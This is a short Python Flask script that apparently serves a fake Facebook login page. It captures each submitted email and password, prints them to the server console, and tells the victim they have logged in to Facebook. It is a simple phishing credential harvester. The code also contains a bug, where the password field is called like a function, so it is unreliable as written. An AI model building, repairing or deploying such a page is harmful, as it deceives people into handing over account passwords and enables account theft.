from flask import Flask,render_template,request
from flask import Flask

app = Flask(__name__,static_folder='static files',static_url_path='/files')

@app.route("/",methods = ["GET","POST"])
def hello_world():
    if request.method == 'POST':
        print(request.form)
        name = request.form['email']
        password = request.form('password')
        print(f"The name is {name} and the password is {password}")
        return "<b> Thanks for using facebook ! you have logged in  "
    return render_template('index.html')


app.run(debug=True)